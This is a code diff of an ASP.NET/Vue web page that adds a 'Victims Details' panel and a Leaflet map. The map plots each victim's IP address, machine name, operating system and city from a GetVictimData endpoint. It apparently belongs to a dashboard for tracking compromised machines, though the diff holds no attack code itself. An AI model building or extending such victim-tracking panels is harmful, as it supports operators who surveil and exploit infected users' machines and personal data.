@@ -82,10 +82,26 @@
         </div><!--</box5-->
 
     </div><!--</boxes menu-->
-
     <div class="col-md-9" style="border-left: 2px solid #666">
+
         <div class="row">
-            <!--Map-->
+            <div class="col-md-12">
+                <div class="box box-danger">
+                    <div class="box-header" style="background-color:#666">
+                        <h4 class="box-title" style="color:#ffff">Victims Details</h4>
+                        
+                        <div class="box-tools pull-right">
+                            <a class="btn btn-social-icon" style="cursor:pointer">
+                                <img v-on:click="updateData()" class="img-fluid" src="~/Images/cloud.png" alt="Responsive image">
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="row">
+            <!--chart-->
             <div class="col-md-5">
                 <div class="box box-danger" style="background-color:#666">
                     <div class="box-body">
@@ -93,8 +109,8 @@
                     </div>
                 </div>
             </div>
-            <!--Gafica-->
-            <div class="col-md-6">
+            <!--map-->
+            <div class="col-md-7">
                 <div class="box box-danger" style="background-color:#666">
                     <div class="box-body">
                         <div id="map" style="height:300px"></div>
@@ -102,17 +118,12 @@
                 </div>
             </div>
 
-            <div class="col-md-1">
-                <div class="box box-danger" style="background-color:#666">
-                    <div class="box-body">
-                        <img v-on:click="updateData()" class="img-fluid" src="~/Images/cloud.png" alt="Responsive image">
-                    </div>
-                </div>
-            </div>
         </div>
 
     </div><!--</Chart's-->
 </div>
+<script src="~/js/javascript-map.min.js"></script>
+
 @section scripts{
 
     <script type="text/javascript">
@@ -122,18 +133,62 @@
             mixins: [vue_base],
             data: {
                 data: [],
+                mapdata:[],
+                markerClusters: L.markerClusterGroup(),
+                Cluster:[],
+                markers: [],
+                map: null,
+                buildingLayers:null,
                 response:''
             },
             mounted() {
+                this.draw_map();
                 this.getVictimsData();
             },
             methods: {
 
-                getVictimsData: function () {
-                    this.get_request('@Url.Action("GetVictimData","Home")').then(response => {
-                        this.data = response.data.mrObject;
-                        console.log(this.data);
+                draw_map: function(){
+
+                    var baseLayer = new L.tileLayer(
+                        'https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+                        // maxZoom: 5
+                         }
+                    );
+
+                    this.map = new L.map('map', {
+                    center: [18.42641, -66.0639655],
+                    zoom: 8,
+                    zoomControl: true,
+                    layers: [baseLayer]
                     });
+                    this.buildingLayers = new L.layerGroup().addTo(this.map);
+                },
+
+                getVictimsData: async function () {
+                   await this.get_request('@Url.Action("GetVictimData","Home")').then(response => {
+                        this.data = response.data.mrObject;
+                        this.mapdata = this.data.alldata;
+                    });
+                    this.draw_mapdata();
+                },
+
+                draw_mapdata: function()
+                {
+                    for(var i = 0; i < this.mapdata.length; i++){
+
+                        var popup =
+                            `<br/><b>IP: `+this.mapdata[i].ip+
+                            `<br/><p>Machine name: `+this.mapdata[i].machineName+
+                            `<br/><p>Machine Os: `+this.mapdata[i].machineOs+
+                            `<br/><p>City: `+this.mapdata[i].city;
+                            
+                        var marker = L.marker([this.mapdata[i].latitude,this.mapdata[i].longitude],{title:1}).bindPopup(popup);
+                        this.markerClusters.addLayer(marker);
+                        this.markers.push(marker);
+                    }
+                    this.Cluster = this.markerClusters;
+                    this.map.addLayer(this.markerClusters);
+
                 },
 
                 updateData: function () {
@@ -143,23 +198,5 @@
                 },
             }
         });
-
-       $(document).ready(function () {
-        //Map Settings
-           var baseLayer = L.tileLayer(
-               'https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
-               maxZoom: 5
-               }
-           );
-
-           window.map = L.map('map', {
-               center: [18.42641, -66.0639655],
-               zoom: 9,
-               zoomControl: false,
-               layers: [baseLayer]
-           });
-
-       });
-
     </script>
 }
